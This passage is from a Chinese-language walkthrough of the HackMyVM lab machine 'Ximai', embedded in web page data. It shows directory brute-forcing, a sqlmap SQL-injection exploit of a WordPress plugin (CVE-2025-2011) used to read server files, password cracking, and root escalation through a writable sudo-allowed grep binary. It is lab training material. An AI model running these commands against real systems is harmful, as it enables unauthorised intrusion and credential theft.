e 36.01 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e ，\u003ccode\u003e80\u003c/code\u003e端口是默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e8080\u003c/code\u003e端口是\u003ccode\u003ewordpress\u003c/code\u003e，并且给出了一个信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e信息是：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e80\u003c/code\u003e端口扫描一下目录，\u003ccode\u003e8000\u003c/code\u003e端口直接上\u003ccode\u003eWPScan\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.62\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET     1022l     5262w    85827c http://192.168.56.62/info.php\n[\u003e-------------------] - 1s      1233/882208  39m     found:1       errors:2      \n[\u003e-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                \n200      GET      376l      965w    10938c http://192.168.56.62/\n200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg\n200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt\n[####################] - 6m    882228/882228  0s      found:5       errors:2      \n[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ \n[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ =\u003e Directory listing (add --scan-dir-listings to scan)  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下面是\u003ccode\u003e80\u003c/code\u003e端口中扫描出来的页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(?说我吗😭)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个\u003ccode\u003ecreds.txt\u003c/code\u003e可能还有点用，因为\u003ccode\u003emysqli.allow_local_infile\u003c/code\u003e也开启着，可以通过数据库去读\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e接下来看\u003ccode\u003eWpscan\u003c/code\u003e 的结果，扫描到存在 \u003ccode\u003eSQL\u003c/code\u003e注入，\u003ccode\u003eCVE-2025-2011\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eCVE-2025-2011\u003c/h2\u003e\n\u003cp\u003ePOC：\u003ca href=\"https://github.com/datagoboom/CVE-2025-2011\"\u003ehttps://github.com/datagoboom/CVE-2025-2011\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e但是这里通过\u003ccode\u003ePOC\u003c/code\u003e无法进行利用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们观察\u003ccode\u003ePOC\u003c/code\u003e，尝试使用\u003ccode\u003eSQLmap\u003c/code\u003e来扫\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esqlmap -u \u003cspan class=\"hljs-string\"\u003e\"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*\u0026#x26;perpage=20\u0026#x26;page=1\u0026#x26;orderBy=source_id\u0026#x26;dateEnd=\u0026#x26;dateStart=\u0026#x26;order=DESC\u0026#x26;sources=\u0026#x26;action=depicter-lead-index\"\u003c/span\u003e -batch  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就可以扫描出来了，我们根据前面的线索来直接读取文件 \u003ccode\u003e/etc/jimmy.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esqlmap -u \u003cspan class=\"hljs-string\"\u003e\"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*\u0026#x26;perpage=20\u0026#x26;page=1\u0026#x26;orderBy=source_id\u0026#x26;dateEnd=\u0026#x26;dateStart=\u0026#x26;order=DESC\u0026#x26;sources=\u0026#x26;action=depicter-lead-index\"\u003c/span\u003e -batch --file-read /etc/jimmy.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  files \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e _etc_jimmy.txt \nHandsomeHU\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003essh\u003c/code\u003e 登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e当头一棒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejimmy@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nsorry, you are restricted from using this \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看环境变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejimmy@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$PATH\u003c/span\u003e\n./...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接恢复一下环境变量就行了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejimmy@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e PATH=\u003cspan class=\"hljs-string\"\u003e\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录下能读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejimmy@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e us3r.txt \nflag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejimmy@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\nWe trust you have received the usual lecture from the \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e System\nAdministrator. It usually boils down to these three things:\n\n    \u003cspan class=\"hljs-comment\"\u003e#1) Respect the privacy of others.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#2) Think before you type.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e#3) With great power comes great responsibility.\u003c/span\u003e\n\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e jimmy: \nSorry, user jimmy may not run \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e on Ximai.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003ewp-config.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/** Database username */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e );       \n                                                                                                \n/** Database password */                                                                        \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'SuperSecret'\u003c/span\u003e ); \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e数据库表信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [wordpress]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n|  1 | adminer    | $wp$2y$10\u003cspan class=\"hljs-variable\"\u003e$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq\u003c/span\u003e | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试密码爆破，这里使用\u003ccode\u003erockyou\u003c/code\u003e无法爆破出来，太慢了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ecupp\u003c/code\u003e生成弱密码字典进行尝试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e也不能破解，我们通过\u003ccode\u003etop 100\u003c/code\u003e加上用户名制作字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ximia \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk \u003cspan class=\"hljs-string\"\u003e'{print \"adminer\"$1}'\u003c/span\u003e \u003e maybe.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003eadminer123456\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMXimai/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e adminer on Ximai:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser adminer may run the following commands on Ximai:\n    (ALL) NOPASSWD: /usr/bin/grep\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/grep \nsorry, you are restricted from using this command.try egrep instead.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e666字符串\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /usr/bin/grep\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'sorry, you are restricted from using this command.try egrep instead.'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限，有写入权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /usr/bin/grep\n-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /bin/bash \u003e /usr/bin/grep\nadminer@Ximai:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e grep\nroot@Ximai:/home/adminer# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Ximai:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e r00t.txt \nflag{root-126e5653-3b02-11f0-b074-000c2921b441}\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Ximai","date":"2025-07-14","updated":"2025-07-14","tags":["HackMyVM","Linux","WordPress","CVE-2025-2011","Password_generator"],"categories":"靶机","comments":true,"description":"Ximai\n\n https://hackmyvm.eu/machines/machine.php?vm=Ximai\n \n\nNotes：More than one path to initial access.\n\n\n\nPS: 靶机的文件夹名字是`Ximai`，不是`Ximia`，做的时候打错了。\n\nRecon\n\n\n\n\n\n访问 `HTTP` ，`80`端口是默认页面\n\n\n\n`8080`端口是`word..."},"recentPosts":[{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month"
